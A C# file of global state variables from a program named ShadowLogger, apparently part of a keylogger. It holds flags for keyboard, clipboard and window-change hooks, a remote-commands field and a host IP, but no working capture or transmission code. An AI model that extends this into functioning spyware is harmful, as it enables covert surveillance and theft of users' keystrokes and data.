using System;
using System.IO;
using System.Text;

namespace ShadowLogger.bin.GlobalVariables {
    internal static class GlobalVariables {
        internal static StringBuilder MainData = new StringBuilder();
        internal static string CbData = string.Empty;
        internal static string RemoteCommandsData = string.Empty;
        internal static string HostIp = string.Empty;
        internal static string AppDirectoryLocation = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
        internal static string ComputerType = string.Empty;
        internal static bool RestartK = false;
        internal static bool RestartCb = false;
        internal static bool RestartWch = false;
        internal static bool CbHookStatus = false;
        internal static bool KHookStatus = false;
        internal static bool WchHookStatus = false;

        }
}
